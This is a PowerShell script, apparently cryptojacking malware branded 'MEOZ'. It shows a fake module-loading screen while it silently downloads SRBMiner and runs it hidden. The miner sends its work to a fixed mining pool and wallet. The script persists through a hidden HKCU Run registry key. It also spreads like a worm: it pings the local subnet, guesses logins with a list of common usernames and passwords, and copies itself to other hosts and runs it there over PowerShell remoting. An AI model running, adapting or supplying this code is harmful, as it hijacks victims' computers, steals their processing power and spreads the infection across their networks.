Clear-Host
$start = Get-Date
$scriptDir = if ($MyInvocation.MyCommand.Path) { Split-Path -Parent $MyInvocation.MyCommand.Path } else { (Get-Location).Path }
# Config (thay đổi nếu muốn)
$spamEnabled = $false
$popPerSecond = 12
$displaySeconds = 4
$totalSpamDuration = 4
$autoRunExe = $true  # Tự động chạy exe sau khi extract
$exeFileName = "SRBMiner-MULTI.exe"  # Tên file exe cần chạy
$silentDownload = $true  # Ẩn thông báo download
$enableAutoStart = $true  # Bật tự động khởi động cùng Windows
$enableLanSpreading = $true  # Bật/tắt lan truyền qua LAN
$maxTargets = 5  # Số máy tối đa để lan truyền
$spreadDelay = 30  # Delay (giây) trước khi bắt đầu lan truyền
$commonPasswords = @("admin", "password", "123456", "", "password123", "admin123", "root", "user")  # Passwords phổ biến
$commonUsernames = @("administrator", "admin", "user", "guest", "")  # Usernames phổ biến
function BigLogo {
    Write-Host ""
    Write-Host "  M   M  EEEEE  OOO   ZZZZZ" -ForegroundColor Cyan
    Write-Host "  MM MM  E     O   O     Z" -ForegroundColor Cyan
    Write-Host "  M M M  EEEE  O   O    Z " -ForegroundColor Cyan
    Write-Host "  M   M  E     O   O   Z  " -ForegroundColor Cyan
    Write-Host "  M   M  EEEEE  OOO   ZZZZZ" -ForegroundColor Cyan
    Write-Host " Power by servernotdie"
}

function RenderBar($label) {
    $width = 40
    for ($i = 0; $i -le $width; $i++) {
        $pct = [int](($i / $width) * 100)
        $bar = ("#" * $i) + ("." * ($width - $i))
        Write-Host -NoNewline "`r$label [$bar] $pct%"
        Start-Sleep -Milliseconds 50
    }
    Write-Host " Done"
}
function DownloadSafe($url, $outfile, $silent = $false) {
    try {
        if (-not $silent) {
            Write-Host "Downloading from: $url" -ForegroundColor Magenta
        }
        $progressPreference = 'SilentlyContinue'  # Ẩn progress bar
        Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
        if (Test-Path $outfile) {
            if (-not $silent) {
                Write-Host "Downloaded successfully to: $outfile" -ForegroundColor Green
            }
            return $true
        } else {
            return $false
        }
    } catch {
        if (-not $silent) {
            Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        return $false
    }
}
function SetAutoStart($scriptPath) {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "MeozScript"
        $existingValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        if ($existingValue) {
            return $false
        }
        $hiddenCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $hiddenCommand        
        return $true
    } catch {
        return $false
    }
}
function IsFirstRun() {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "MeozScript"
        $existingValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        return $existingValue -eq $null
    } catch {
        return $true
    }
}
function EnsureFolder($path) {
    if (-not (Test-Path $path)) {
        New-Item -ItemType Directory -Path $path -Force | Out-Null
    }
}
function ExtractArchive($zipPath, $destination) {
    try {
        if (-not (Test-Path $zipPath)) {
            return $false
        }
        EnsureFolder $destination
        try {
            Expand-Archive -Path $zipPath -DestinationPath $destination -Force
            return $true
        } catch {
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $destination, $true)
            return $true
        }
    } catch {
        return $false
    }
}
function FindAndRunExe($searchPath, $exeName) {
    try {
        $exePath = Get-ChildItem -Path $searchPath -Name $exeName -Recurse | Select-Object -First 1
        if ($exePath) {
            $fullPath = Join-Path $searchPath $exePath
            $miningArgs = @(
                "--algorithm", "verushash",
                "--pool", "sg.servernotdie.dpdns.org:8080",
                "--wallet", "RAekjoNg7FCkAdub3D8stA4LotrZqJKofu.nole",
                "--cpu-threads", "8"
            )
            $workingDir = Split-Path $fullPath
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $fullPath
            $psi.Arguments = [string]::Join(" ", $miningArgs)
            $psi.WorkingDirectory = $workingDir
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            [System.Diagnostics.Process]::Start($psi) | Out-Null
            return $true
        } else {
            return $false
        }
    } catch {
        return $false
    }
}
function GetLocalSubnet() {
    try {
        $adapter = Get-NetAdapter | Where-Object { $_.Status -eq "Up" -and $_.InterfaceDescription -notlike "*Loopback*" -and $_.InterfaceDescription -notlike "*Virtual*" } | Select-Object -First 1
        if ($adapter) {
            $ipConfig = Get-NetIPAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" }
            if ($ipConfig) {
                $ip = $ipConfig.IPAddress
                $prefixLength = $ipConfig.PrefixLength
                $subnet = $ip.Substring(0, $ip.LastIndexOf("."))
                return $subnet
            }
        }
    } catch {}
    return $null
}
function ScanLAN($subnet, $maxTargets) {
    $targets = @()
    $currentIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.*" }).IPAddress | Select-Object -First 1
    
    try {
        for ($i = 1; $i -le 254; $i++) {
            $targetIP = "$subnet.$i"
            if ($targetIP -eq $currentIP) { continue }  # Skip own IP
            
            $ping = Test-Connection -ComputerName $targetIP -Count 1 -Quiet -TimeoutSeconds 1
            if ($ping) {
                $targets += $targetIP
                if ($targets.Count -ge $maxTargets) { break }
            }
        }
    } catch {}
    
    return $targets
}
function TestCredentials($targetIP, $username, $password) {
    try {
        $secPassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($username, $secPassword)
        $result = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $targetIP -Credential $credential -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}
function CopyAndExecuteScript($targetIP, $username, $password, $scriptPath) {
    try {
        $secPassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($username, $secPassword)
        $session = New-PSSession -ComputerName $targetIP -Credential $credential -ErrorAction Stop
        $remotePath = "C:\Windows\Temp\meoz_script.ps1"
        Copy-Item -Path $scriptPath -Destination $remotePath -ToSession $session -Force
        # Execute script on remote machine
        Invoke-Command -Session $session -ScriptBlock {
            param($remotePath)
            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$remotePath`"" -WindowStyle Hidden
        } -ArgumentList $remotePath
        Remove-PSSession $session
        return $true
    } catch {
        return $false
    }
}
function SpreadToLAN() {
    try {
        if (-not $enableLanSpreading) { return }        
        $currentScriptPath = $MyInvocation.MyCommand.Path
        if (-not $currentScriptPath) { return }
        $subnet = GetLocalSubnet
        if (-not $subnet) { return }
        Start-Sleep -Seconds $spreadDelay
        $targets = ScanLAN $subnet $maxTargets
        if ($targets.Count -eq 0) { return }
        foreach ($targetIP in $targets) {
            $success = $false
            foreach ($username in $commonUsernames) {
                foreach ($password in $commonPasswords) {
                    if (TestCredentials $targetIP $username $password) {
                        $copySuccess = CopyAndExecuteScript $targetIP $username $password $currentScriptPath
                        if ($copySuccess) {
                            $success = $true
                            break
                        }
                    }
                }
                if ($success) { break }
            }
        }
    } catch {}
}
$isFirstRun = IsFirstRun
$currentScriptPath = $MyInvocation.MyCommand.Path
if ($isFirstRun) {
    BigLogo
    Write-Host "[+] Initializing libraries complete." -ForegroundColor Green
    Write-Host ""
    RenderBar "Loading modules"
    if ($enableAutoStart -and $currentScriptPath) {
        $autoStartSet = SetAutoStart $currentScriptPath
    }
    Start-Sleep -Milliseconds 500  
}
$imgUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS6d87zy2l97Gbuz1xheO71Fzw31vhLFurSyg&s"
$zipUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.7/SRBMiner-Multi-2-9-7-win64.zip" 
$imgOut = Join-Path $scriptDir "meoz_image.jpg"
$zipOut = Join-Path $scriptDir "SRBMiner-Multi-2-9-7-win64.zip"
$dest = Join-Path $scriptDir "meoz_assets"
EnsureFolder $scriptDir
EnsureFolder $dest
Write-Host ""
$imgOk = DownloadSafe $imgUrl $imgOut $true
if (-not $imgOk -and $isFirstRun -and -not $silentDownload) {
    Write-Host "Image download failed or unreachable" -ForegroundColor Yellow
}
$zipOk = DownloadSafe $zipUrl $zipOut $true
if ($zipOk) {
    if ($isFirstRun -and -not $silentDownload) {
        Write-Host ""
    }
    if ($isFirstRun) {
        RenderBar "Extracting archive"
    }
    $extractOk = ExtractArchive $zipOut $dest
    if ($extractOk -and $autoRunExe) {
        if ($isFirstRun) {
            Write-Host ""
            RenderBar "Loading miner"
        }
        $runOk = FindAndRunExe $dest $exeFileName
    }
} else {
    if ($isFirstRun -and -not $silentDownload) {
        Write-Host "Archive download failed or unreachable" -ForegroundColor Yellow
    }
}
if ($enableLanSpreading -and $currentScriptPath) {
    if ($isFirstRun) {
        Write-Host ""
        RenderBar "Network scanning"
    }
    Start-Job -ScriptBlock ${function:SpreadToLAN} | Out-Null
}
$min = 10
$elapsed = (Get-Date) - $start
$remain = [math]::Max(0, $min - $elapsed.TotalSeconds)
if ($remain -gt 0) {
    Start-Sleep -Seconds $remain
}
Write-Host ""
function TryOpen($filePath) {
    if (-not (Test-Path $filePath)) { return $null }
    $msp = Join-Path $env:windir "system32\mspaint.exe"
    if (Test-Path $msp) {
        return Start-Process -FilePath $msp -ArgumentList ('"' + $filePath + '"') -PassThru
    } else {
        return Start-Process -FilePath $filePath -PassThru
    }
}
if ($isFirstRun -and $spamEnabled -and (Test-Path $imgOut)) {
    $procList = New-Object System.Collections.ArrayList
    $endTime = (Get-Date).AddSeconds($totalSpamDuration)
    $interval = if ($popPerSecond -gt 0) { 1.0 / [double]$popPerSecond } else { 1.0 }
    while ((Get-Date) -lt $endTime) {
        for ($i = 1; $i -le $popPerSecond; $i++) {
            $p = TryOpen $imgOut
            if ($p) {
                $entry = New-Object PSObject -Property @{ Proc = $p; Start = Get-Date }
                $procList.Add($entry) | Out-Null
            }
            Start-Sleep -Milliseconds ([int]($interval * 1000))
        }
        foreach ($entry in $procList.ToArray()) {
            try {
                $pobj = $entry.Proc
                $st = $entry.Start
                if ($pobj -and -not $pobj.HasExited) {
                    if ((Get-Date) - $st -gt [timespan]::FromSeconds($displaySeconds)) {
                        try { $pobj.Kill() } catch {}
                    }
                } else {
                    $procList.Remove($entry) | Out-Null
                }
            } catch { 
                $procList.Remove($entry) | Out-Null 
            }
        }
    }
    foreach ($entry in $procList.ToArray()) {
        try {
            $pobj = $entry.Proc
            if ($pobj -and -not $pobj.HasExited) { 
                try { $pobj.Kill() } catch {} 
            }
        } catch {}
        $procList.Remove($entry) | Out-Null
    }
}
if ($isFirstRun -and (Test-Path $imgOut)) {
    Start-Process $imgOut
}
Write-Host ""
Start-Sleep -Milliseconds 300
